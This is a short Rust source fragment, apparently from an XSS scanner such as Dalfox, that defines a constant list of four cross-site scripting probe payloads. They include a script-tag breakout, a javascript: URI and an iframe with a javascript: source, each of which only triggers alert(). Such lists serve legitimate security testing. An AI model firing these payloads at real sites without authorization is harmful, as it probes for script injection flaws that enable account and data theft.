pub const XSS_JAVASCRIPT_PAYLOADS: &[&str] = &[
    "</script><script>alert(1)</script>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<script>alert('dalfox')</script>",
];
